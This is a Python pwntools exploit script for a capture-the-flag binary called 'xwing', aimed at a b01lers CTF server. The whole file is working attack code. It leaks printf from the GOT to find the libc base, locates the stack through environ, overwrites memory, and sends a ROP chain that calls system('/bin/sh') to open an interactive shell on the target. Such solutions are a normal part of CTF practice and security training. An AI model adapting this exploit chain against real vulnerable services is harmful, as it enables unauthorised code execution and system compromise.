#!/usr/bin/env python3
from pwn import *
import logging
from binascii import hexlify, unhexlify
import time

# shellcodes['binsh32']
# shellcodes['binshx86_64']
# gethex(string)
ltrace = False

log = logging.getLogger("Exploit")

context.arch = "amd64"
context.terminal = ["alacritty", "-e", "sh", "-c"]

context.log_level = "info"

BINARY = "./xwing.dist"
HOST, PORT = "localhost", 1337
HOST, PORT = "xwing.pwn.ctf.b01lers.com", 1337
LIBC_PATH = "/usr/lib/libc.so.6"

GDB_SETUP = """
set follow-fork-mode child
# b logwin
c
"""
binary = ELF(BINARY)

flags = []

if "--live" not in sys.argv:
    if ltrace:
        p = heap_ltrace(BINARY, stdin=PTY)
    else:
        p = process(BINARY, stdin=PTY)
    if "--debug" in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)
    LIBC_PATH = "./xwing.libc"

if LIBC_PATH:
    libc = ELF(LIBC_PATH)


shipEngine = binary.symbols["shipEngine"]
damage = binary.symbols["damage"]
distance = binary.symbols["distance"]


def recvuntilprompt():
    global flags
    result = p.recvuntil("\n\033[36m>\033[0m ")
    if b"flag" in result:
        flags += [result]
    print(result)
    return result



def examine(location: int, length: int):
    """
    Reads length from the target location
    """

    p.sendline("examine {} {}".format(hex(location), str(length)))
    resp = recvuntilprompt()
    resp = resp.split(b"\n")[10:-3]
    buf = b""
    for line in resp:
        if b"0x" not in line:
            continue
        line = line.split(b':')[1][:3*16]
        buf += b"".join(line.split())
    buf = unhexlify(buf)
    return buf


def fix(location: int, value: int):
    """
    Writes 64 bits at the target address
    """
    p.sendline("fix {} {}".format(hex(location), hex(value)))


def throttle(speed: int):
    p.sendline("throttle {}".format(str(speed)))
    resp = recvuntilprompt()


def hyperdrive(on: bool):
    p.sendline("hyperdrive {}".format("on" if on else "off"))
    resp = recvuntilprompt()


p.recvuntil("Authorization Required:\x1b[0m ")
p.sendline("LeiaIsCute")
recvuntilprompt()

print(hexlify(examine(shipEngine, 8)))
shipEngineAddr = u64(examine(shipEngine, 8))

printf = u64(
    examine(binary.got["printf"], 8)
)
libc_base = printf - libc.symbols["printf"]

environ_addr = libc_base + libc.symbols["environ"]
environ = u64(examine(environ_addr, 8))
logwin_ret = environ - 256

fix(damage, 0x000000007FFFFFFF)
recvuntilprompt()

p.sendline("target 2")
recvuntilprompt()
p.sendline("attack")
recvuntilprompt()
p.sendline("target 1")
recvuntilprompt()
p.sendline("attack")
recvuntilprompt()
p.sendline("target 0")
recvuntilprompt()
p.sendline("attack")
recvuntilprompt()

p.sendline(b"A" * (0x20 - 16) + p64(0) + p64(33) + p64(logwin_ret) + p64(0))
p.sendline(b"tmp")

rop = ROP(binary)
rop.call(
    libc_base + libc.symbols["system"], [libc_base + next(libc.search(b"/bin/sh\x00"))]
)
p.sendline(bytes(rop))

p.interactive()

if ltrace:
    trace = p.trace_now()
    p.print_freed()
    p.print_allocd()

print(flags)
